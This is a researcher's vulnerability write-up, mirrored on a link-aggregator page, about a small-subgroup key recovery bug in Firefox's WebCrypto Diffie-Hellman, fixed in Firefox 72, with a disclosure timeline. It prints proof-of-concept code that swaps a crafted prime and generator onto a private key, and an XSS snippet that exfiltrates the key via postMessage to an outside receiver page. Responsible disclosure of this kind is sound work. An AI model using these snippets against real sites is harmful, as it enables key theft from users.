<!DOCTYPE html>
<html lang="en">
<head>
    <title>
The Curious Case of WebCrypto Diffie-Hellman on Firefox -
linksfor.dev(s)
    </title>
    <link rel="alternate" type="application/rss+xml" title="Linksfor.dev(s) feed" href="https://linksfor.dev/feed.rss" />
    <meta charset="utf-8">
    <meta name="Description" content="A curated source of links that devs might find interesting. Updated around the clock." />
    <meta name="google" value="notranslate">
    <link rel="stylesheet" type="text/css" href="/style.css" />
    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
    <link rel="icon" href="/favicon.ico" type="image/x-icon">
</head>
<body>
    <div class="grid">
        
<div class="readable">
    <div id="readOverlay" class="style-ebook" xmlns=""><div id="readInner" class="margin-medium size-medium"><h1>The Curious Case of WebCrypto Diffie-Hellman on Firefox</h1><div><div class="post-body entry-content float-container" id="post-body-7432388175917295566" xmlns="http://www.w3.org/1999/xhtml"><p><b>tl;dr </b>Mozilla Firefox prior to version 72 suffers from <i>Small Subgroups Key Recovery Attack on DH</i> in the <i><b>WebCrypto</b></i>'s API. The Firefox's team fixed the issue <u><b>r</b><b>emoving completely</b></u> support for DH over finite fields (that is not in the WebCrypto standard). If you find this interesting read further below.</p><h1>
Premise</h1><div><p class="readability-styled" style="display: inline;" xmlns="">
In this blog post I assume you are already knowledgeable about Diffie-Hellman over finite fields and related attacks. If not I recommend to read any cryptography book that covers public key cryptography. Here is a really cool simple explanation by </p><a href="https://twitter.com/cryptodavidw">David Wong</a><p class="readability-styled" style="display: inline;" xmlns="">:</p><p class="readability-styled" style="display: inline;" xmlns=""> 
If you want more details about </p><i><b>Small Subgroups Key Recovery Attack on DH</b></i><p class="readability-styled" style="display: inline;" xmlns=""> I covered some background in one of my previous post (</p><a href="https://blog.intothesymmetry.com/2016/01/openssl-key-recovery-attack-on-dh-small.html">OpenSSL Key Recovery Attack on DH small subgroups (CVE-2016-0701)</a><p class="readability-styled" style="display: inline;" xmlns=""> ). There is also an </p><a href="https://eprint.iacr.org/2016/995.pdf">academic pape</a><a href="https://www.blogger.com/null">r</a><p class="readability-styled" style="display: inline;" xmlns=""> where we examine the issue with some more rigors. If you want to read the original attack I recommend the </p><a href="http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.44.5296">Lim-Lee</a><p class="readability-styled" style="display: inline;" xmlns="">'s seminal paper.</p></div><h1>
Introduction</h1><div><p class="readability-styled" style="display: inline;" xmlns="">
The </p><a href="https://www.w3.org/TR/WebCryptoAPI/">Web Cryptography API</a><p class="readability-styled" style="display: inline;" xmlns=""> is a specification that describes a JavaScript API for performing basic
        cryptographic operations in web applications. This was always a controversial topic between people in the crypto arena and you can read some eminent opinion in the wild e.g. :</p></div><p>
Said that this post is not about the usefulness of WebCrypto so I'll spare you my opinion on the topic :p</p><h1>
WebCrypto API</h1><div><p class="readability-styled" style="display: inline;" xmlns="">
Ok you might say, now we have three paragraphs about WebCrypto but how is this looking like? Luckily the good </p><a href="https://github.com/diafygi">diafygi</a><p class="readability-styled" style="display: inline;" xmlns=""> comes to the rescue with a </p><a href="https://diafygi.github.io/webcrypto-examples/">full page of examples</a></div><br><div><p class="readability-styled" style="display: inline;" xmlns="">
Really simple no? In a similar way of encrypting using </p><b><i>AES-GCM </i></b><p class="readability-styled" style="display: inline;" xmlns="">the WebCrypto API provides you simple ways for using </p><i><b>HMAC</b></i><p class="readability-styled" style="display: inline;" xmlns="">, </p><i><b>RSA</b></i><p class="readability-styled" style="display: inline;" xmlns="">, </p><i><b>ECDSA</b></i><p class="readability-styled" style="display: inline;" xmlns="">, </p><i><b>ECDH</b></i><p class="readability-styled" style="display: inline;" xmlns=""> and so on... Beautiful. So how popular is this API? Luckily we can even have an answer for it thanks to telemetry (and </p><a href="https://twitter.com/_franziskus_">Franziskus Kiefer</a><p class="readability-styled" style="display: inline;" xmlns=""> that showed it to me):</p><p class="readability-styled" style="display: inline;" xmlns="">
The graph above is taken directly from </p><a href="https://telemetry.mozilla.org/new-pipeline/dist.html#!cumulative=0&amp;end_date=2019-12-05&amp;include_spill=0&amp;keys=__none__!__none__!__none__&amp;max_channel_version=nightly%252F72&amp;measure=WEBCRYPTO_ALG&amp;min_channel_version=nightly%252F62&amp;processType=*&amp;product=Firefox&amp;sanitize=0&amp;sort_by_value=0&amp;sort_keys=submissions&amp;start_date=2019-10-21&amp;table=0&amp;trim=1&amp;use_submission_date=0">Firefox's telemetry</a><p class="readability-styled" style="display: inline;" xmlns=""> but what are those weird numbers? Well in order to make some sense out of it you need to look at </p><a href="https://searchfox.org/mozilla-central/source/dom/crypto/WebCryptoTask.cpp#59">the source code</a><p class="readability-styled" style="display: inline;" xmlns="">!!! :</p><p class="readability-styled" style="display: inline;" xmlns="">
So for some weird reason </p><i><b>AES CBC </b></i><p class="readability-styled" style="display: inline;" xmlns="">is the most used method in Firefox nightly 72 followed by the two </p><i><b>SHA</b></i><p class="readability-styled" style="display: inline;" xmlns=""> methods.</p><br><h1>
WebCrypto Security</h1><p class="readability-styled" style="display: inline;" xmlns="">
There are many places in the web where WebCrypto security is discussed in depth. Some pointers are </p><a href="https://twitter.com/harryhalpin">Harry Halpin</a><p class="readability-styled" style="display: inline;" xmlns=""> slides delivered at </p><a href="https://csrc.nist.gov/csrc/media/events/ssr-2016-security-standardisation-research/documents/presentation-mon-halpin.pdf">Security Standardization Research Conference</a><p class="readability-styled" style="display: inline;" xmlns=""> or </p><a href="https://twitter.com/ttaubert">Tim Taubert</a><p class="readability-styled" style="display: inline;" xmlns=""> talk at </p><a href="https://2014.jsconf.eu/speakers/tim-taubert-keeping-secrets-with-javascript-an-introduction-to-the-webcrypto-api.html">JS Conf</a><p class="readability-styled" style="display: inline;" xmlns="">.&nbsp; Said that, this is the way a </p><span class="css-901oao css-16my406 r-1qd0xha r-ad9z0x r-bcqeeo r-qvutc0"><span class="css-901oao css-16my406 r-1qd0xha r-ad9z0x r-bcqeeo r-qvutc0"><a href="https://twitter.com/jurajsomorovsky">Juraj Somorovsky</a></span></span><p class="readability-styled" style="display: inline;" xmlns="">(a colleague of mine at </p><a href="https://www.nds.ruhr-uni-bochum.de/chair/news/">Ruhr-Universit√§t Bochum</a><p class="readability-styled" style="display: inline;" xmlns="">) described it and I found the parallelism great:</p><p class="readability-styled" style="display: inline;" xmlns="">
So what does it mean? Well basically when a cryptographic key is </p><i>created/imported</i><p class="readability-styled" style="display: inline;" xmlns="">, there is an </p><span><b>extractable</b></span><p class="readability-styled" style="display: inline;" xmlns="">property that if set to </p><b><span>false</span></b><p class="readability-styled" style="display: inline;" xmlns="">will not allow (as the property name hints) the extraction of raw key material (aka the value of the key).&nbsp; So even if an attacker will be able to gain </p><u><b>XSS privilege he will not be able to steal the key</b></u><p class="readability-styled" style="display: inline;" xmlns="">!!. See the&nbsp; example below :</p><br><span>In this example an exception is caught&nbsp; and logged at <span>line 29</span>:</span><br><b><span><span class="message-body-wrapper"><span class="message-flex-body"><span class="message-body devtools-monospace"><span class="objectBox-stackTrace" data-link-actor-id="server0.conn0.child1/obj51">DOMException: "A parameter or an operation is not supported by the underlying object"</span></span></span></span></span></b><br><span><span class="message-body-wrapper"><span class="message-flex-body"><span class="message-body devtools-monospace"><span class="objectBox-stackTrace" data-link-actor-id="server0.conn0.child1/obj51">The reason is because the key is declared as not extractable at <span>line 7<span>.</span></span></span></span></span></span></span><br><h2><span></span><span>WebCrypto DH</span></h2><p class="readability-styled" style="display: inline;" xmlns="">
So we arrived to talk about </p><a href="https://github.com/diafygi/webcrypto-examples/#dh">WebCrypto DH</a><p class="readability-styled" style="display: inline;" xmlns="">. Let's go directly to the point. </p><i><b>Diffie-Hellman over finite fields </b></i><p class="readability-styled" style="display: inline;" xmlns="">(DH from now on) is not in the WebCrypto specification and is (until today) implemented only by Mozilla Firefox (for the record from </p><b><i>Elliptic Curve Diffie-Hellman -ECDH</i></b><p class="readability-styled" style="display: inline;" xmlns=""> is instead</p><a href="https://www.w3.org/TR/WebCryptoAPI/#ecdh"><b> part of the specification</b></a><p class="readability-styled" style="display: inline;" xmlns="">). This was argument of&nbsp; a </p><a href="https://lists.w3.org/Archives/Public/public-webcrypto/2015Oct/0000.html">little debate during the specification development</a><p class="readability-styled" style="display: inline;" xmlns=""> but at the end </p><a href="https://twitter.com/sleevi_">Ryan Sleevi</a><p class="readability-styled" style="display: inline;" xmlns=""> made </p><a href="https://lists.w3.org/Archives/Public/public-webcrypto/2015Oct/0004.html">the point</a><p class="readability-styled" style="display: inline;" xmlns=""> (BTW Google Chrome </p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=438391">never implemented it</a><p class="readability-styled" style="display: inline;" xmlns="">)</p><p class="readability-styled" style="display: inline;" xmlns="">
For some reason Mozilla Firefox decided to keep the implementation of&nbsp; </p><b><i>WebCrypto DH</i></b><p class="readability-styled" style="display: inline;" xmlns="">. Now a typical potential</p><b><i> WebCrypto DH</i></b><p class="readability-styled" style="display: inline;" xmlns=""> scenario usage is the following:</p><br><ol><li><i>Alice</i><b>generates</b> a DH <b>key pair</b> and send to <i>Bob&nbsp;</i></li><li><i>Bob</i><b>generates</b> his own <b>key pair</b></li><li><i>Bob</i> can now <b>derive</b> a shared secret to use for example as a secret key for <b>AES-GCM</b> encryption (as above)</li></ol><h2><span>The Bug</span></h2><p class="readability-styled" style="display: inline;" xmlns="">
Pfiuuu so let's talk about the bug. One of the biggest criticism that people makes about DH is that the choice of parameters is error prone. Indeed differently from </p><b>ECDH </b><p class="readability-styled" style="display: inline;" xmlns="">where the set of curves to use is limited (</p><i><b>P-256</b></i><p class="readability-styled" style="display: inline;" xmlns=""> and </p><i><b>Curve25519</b></i><p class="readability-styled" style="display: inline;" xmlns=""> are probably covering almost 100% of the use cases) for the finite field case it is possible to use any prime number that is sufficiently large (also for this case exist some specification that suggest some specific numbers, see also my previous </p><a href="https://blog.intothesymmetry.com/2016/01/what-heck-is-rfc-5114.html">post</a><p class="readability-styled" style="display: inline;" xmlns="">). In order to avoid most of the attacks a prime number used for DH needs to cover two important requirements:</p></div><div><ol><li>Being sufficiently large (at least 2048 bits in 2019)</li><li>Being <span>p</span> the prime number chosen <span>p-1</span> needs to be not smooth (again refer to my previous 2 posts for more details <a href="https://blog.intothesymmetry.com/2016/01/what-heck-is-rfc-5114.html">1</a>,<a href="https://blog.intothesymmetry.com/2016/01/openssl-key-recovery-attack-on-dh-small.html">2</a>). Many primes in the specifications are so called <a href="https://en.wikipedia.org/wiki/Safe_prime">safe primes</a> in order to meet the non smoothness requirement.</li></ol><p class="readability-styled" style="display: inline;" xmlns="">
Now let's assume a website implement the scenario depicted above with a </p><i><b>safe prime</b></i><p class="readability-styled" style="display: inline;" xmlns=""> taken from some IETF specification and let's also assume an attacker was able to gain some </p><u><b>XSS privilege</b></u><p class="readability-styled" style="display: inline;" xmlns=""> in this website. The following snippet shows how the attacker will be able to recover the private key using the </p><i><b>Small Subgroups Key Recovery Attack</b></i><p class="readability-styled" style="display: inline;" xmlns=""> (I am a biiiiiiit lazy and I extracted only the key modulo 5, a full attack would use several prime numbers and then </p><a href="https://en.wikipedia.org/wiki/Chinese_remainder_theorem"><i><b>Chinese Remainder Theorem- </b><b>CRT</b></i></a><p class="readability-styled" style="display: inline;" xmlns=""> to recover the full key, again you can find full explanation in my previous</p><b><a href="https://blog.intothesymmetry.com/2016/01/openssl-key-recovery-attack-on-dh-small.html">OpenSSL blog pos</a><a href="https://www.blogger.com/null">t</a></b><p class="readability-styled" style="display: inline;" xmlns="">).
</p><p class="readability-styled" style="display: inline;" xmlns="">
The vulnerable code is the one at </p><span>line 7</span><p class="readability-styled" style="display: inline;" xmlns=""> and</p><span> line 8 </span><span>:</span><p><span><span>const MALICIOUS_PRIME = new Uint8Array([129,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17]);<br>// this generator has order 5</span></span></p><p><span><span>const MALICIOUS_GENERATOR = new Uint8Array([46,35,147,92,93,21,176,170,70,144,93,164,112,85,178,126]);</span></span><b><span><span></span></span></b></p><p><b><span><span>privateKey.algorithm.prime = MALICIOUS_PRIME;<br>privateKey.algorithm.generator = MALICIOUS_GENERATOR;&nbsp;</span></span></b>&nbsp;
<span></span>&nbsp;</p><p class="readability-styled" style="display: inline;" xmlns="">
Let me explain, what the attacker achieved here was to:</p><br><ol><li><span>Craft a malicious<b> prime number </b>(the prime number used in this example is <span>171470411456254147604591110776164450321</span> that has <span>p-1</span> equals to <span>2^4 * 5 * 23 * 2082757 * 744748579247 * 60079053324863537&nbsp;</span> (so it is kind of smooth)</span></li><li><span>Forge a malicious <b>generator </b>(in this example I used a generator of <u><b><span>order 5</span></b></u>, see also the <span>p-1</span> above)</span></li><li><b><span>Redefine the generator and the prime associated with the existing private key!!!!</span></b><u><b><span> (THIS IS THE REAL BUG)</span></b></u></li><li><span>Repeat this with many <b>prime numbers/generators</b></span></li><li><span>Use <b>CRT</b> to recover&nbsp; the full private key</span></li></ol><span>Well that's about it. Luckily as the telemetry data showed this API (but the WebCrypto API in general is not really used/popular) so Firefox could safely remove completely this non standard API rather than fix the bug<span>.</span></span><br><h2><span>Demo Time</span></h2><p class="readability-styled" style="display: inline;" xmlns="">
You can find a simple demo at </p><a href="https://asanso.github.io/firefox/victim.html">https://asanso.github.io/firefox/victim.html</a><p class="readability-styled" style="display: inline;" xmlns=""> . It simply does an </p><span>alert()</span><p class="readability-styled" style="display: inline;" xmlns=""> with the extracted </p><b>private key modulo 5</b><p class="readability-styled" style="display: inline;" xmlns="">. As said I was a lazy to implement the full attack (sorry :( ) but I hope you got the point. As a bonus point though I added some little snippet on how an attacker could exfiltrate the key using </p><span>postMessage:</span><br><span><b>&nbsp;&nbsp;&nbsp; //XSS starts here<br>//exfiltrate the privateKey through postMessage<br>//the attacker receiver domanin can of course be different</b><br>var ifr = document.createElement("iframe")<br>ifr.src = "https://asanso.github.io/firefox/receiver.html"<br>ifr.id = "frm";<br>document.body.appendChild(ifr);<br>var frm = document.getElementById('frm').contentWindow;<br>frm.postMessage(kpE.privateKey,"https://asanso.github.io/firefox/receiver.html");</span><br><h1>
The fix</h1><h1 id="disclosure-timeline">
Disclosure timeline</h1><b>27-06-2018 - </b><p class="readability-styled" style="display: inline;" xmlns="">Reported the issue via bugzilla: </p><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1471684">Bug 1471684</a><br><b><b>28-06-2018 </b>- </b><p class="readability-styled" style="display: inline;" xmlns="">Firefox security team confirmed the vulnerability (setting impact to </p><b>Moderate</b><p class="readability-styled" style="display: inline;" xmlns="">)</p><br><b>28-03-2019 -</b><span><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1539578">Bug 1539578</a>: <i>Add telemetry for DH use in WebCrypto API</i> was created</span><br><b>28-10-2019 -</b><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1564509">Bug 1564509</a><p class="readability-styled" style="display: inline;" xmlns="">: </p><i>Remove support for DH from WebCrypto API (not in spec)</i><p class="readability-styled" style="display: inline;" xmlns=""> was created</p><br><b>07-01-2020 - </b><p class="readability-styled" style="display: inline;" xmlns="">Firefox 72 containing the fix was released</p><br><b></b><br><h2><span> Acknowledgement</span></h2></div><div><p class="readability-styled" style="display: inline;" xmlns="">
I would like to thank </p><a href="https://twitter.com/_franziskus_">Franziskus Kiefer</a><p class="readability-styled" style="display: inline;" xmlns=""> and all the Firefox Security team, as usual you rock!</p></div><h2>
That's all folks! For more Crypto stuff <a href="https://twitter.com/asanso">follow me on Twitter</a>.</h2></div></div></div></div>
</div>
    </div>
    <footer>
        <div>created by buildstarted &copy; 2020 <a href="/about">about</a></div>
        <div>Share this page on social media: copy and paste this url https://linksfor.dev/</div>
        <div>If you prefer RSS: <a href="https://linksfor.dev/feed.xml">https://linksfor.dev/feed.xml</a></div>
    </footer>
    
    <script>
        (function () {
            var COLLECT_URL = "https://dna.buildstarted.com/t";
            var SITE_ID = "linksfor.devs";
            var GLOBAL_VAR_NAME = "__DNA__";

            window[GLOBAL_VAR_NAME] = {};

            window[GLOBAL_VAR_NAME].sendPageView = function () {
                var path = location.pathname;
                var referrer = document.referrer;

                var url = COLLECT_URL + "?siteid=" + SITE_ID + "&p=" + encodeURIComponent(path) + "&r=" + encodeURIComponent(referrer);

                try { fetch(url, { method: "GET" }); } catch (e) { }
            };

            window[GLOBAL_VAR_NAME].sendPageView();
        })();
    </script>
</body>
</html>